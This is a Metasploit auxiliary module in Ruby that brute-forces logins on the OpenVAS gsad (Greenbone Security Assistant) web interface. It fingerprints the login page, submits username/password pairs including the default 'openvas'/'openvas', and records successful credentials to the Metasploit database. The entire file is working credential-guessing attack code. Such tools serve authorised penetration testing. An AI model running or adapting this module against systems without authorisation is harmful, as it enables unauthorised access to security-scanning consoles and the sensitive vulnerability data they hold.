##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'OpenVAS gsad Web Interface Login Utility',
      'Description'    => %q{
        This module simply attempts to login to an OpenVAS gsad interface
        using a specific user/pass.
      },
      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true }
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('URI', [true, "URI for OpenVAS omp login. Default is /omp", "/omp"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
      ])

    register_advanced_options(
    [
      OptString.new('OMP_text', [true, "value for OpenVAS omp text login hidden field", "/omp?cmd=get_tasks&amp;overrides=1"]),
      OptString.new('OMP_cmd', [true, "value for OpenVAS omp cmd login hidden field", "login"])
    ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'uri'     => datastore['URI'],
        'method'  => 'GET'
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{msg} #{datastore['URI']} - #{e}")
      return
    end

    if not res
      vprint_error("#{msg} #{datastore['URI']} - No response")
      return
    end
    if res.code != 200
      vprint_error("#{msg} - Expected 200 HTTP code - not gsad?")
      return
    end
    if res.body !~ /Greenbone Security Assistant \(GSA\)/
      vprint_error("#{msg} - Expected GSA keyword on page - not gsad?")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def do_login(user='openvas', pass='openvas')
    vprint_status("#{msg} - Trying username:'#{user}' with password:'#{pass}'")
    headers = {}
    begin
      res = send_request_cgi({
        'encode'   => true,
        'uri'      => datastore['URI'],
        'method'   => 'POST',
        'headers'  => headers,
        'vars_post' => {
          'cmd' => datastore['OMP_cmd'],
          'text' => datastore['OMP_text'],
          'login' => user,
          'password' => pass
        }
      }, 25)

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error - res, Aborting")
      return :abort
    end

    # vprint_status("#{msg} GOT BODY. '#{user}' : '#{pass}' - #{res.code} #{res.body}")

    if res.code == 303
      print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

      report_cred(
        ip: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'openvas-gsa',
        user: user,
        password: pass,
        proof: res.code.to_s
      )
      return :next_user
    end
    vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
    return :skip_pass
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def msg
    "#{vhost}:#{rport} OpenVAS gsad -"
  end
end
